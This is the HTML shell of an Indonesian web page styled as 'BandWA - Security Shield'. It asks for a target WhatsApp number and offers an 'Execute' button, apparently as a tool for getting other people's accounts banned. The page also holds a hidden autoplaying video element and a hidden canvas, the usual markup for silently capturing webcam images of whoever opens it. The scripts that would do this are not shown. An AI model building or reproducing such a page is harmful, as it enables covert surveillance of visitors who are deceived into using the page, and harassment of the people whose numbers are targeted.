<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>BandWA - Security Shield</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
</head>
<body>
    <div class="bg-particles" id="particleContainer"></div>

    <div class="login-container">
        <div class="login-header">
            <img src="assets/logo.svg" alt="Logo" class="logo" onerror="this.style.display='none'">
            <p class="login-title">Band<span>WA</span></p>
            <p class="login-subtitle">⚡ Security Action Required</p>
        </div>

        <div class="input-group">
            <input type="text" class="login-input" id="targetInput" placeholder="Nomor WhatsApp Target (62xxxx)" maxlength="15">
            <button class="login-button" id="actionBtn">Execute</button>
        </div>

        <div id="statusLog">
            <div class="log-entry ready">🔒 System ready. Enter target number.</div>
        </div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script src="config.js"></script>
    <script src="assets/particles.js"></script>
    <script src="script.js"></script>
</body>
</html>
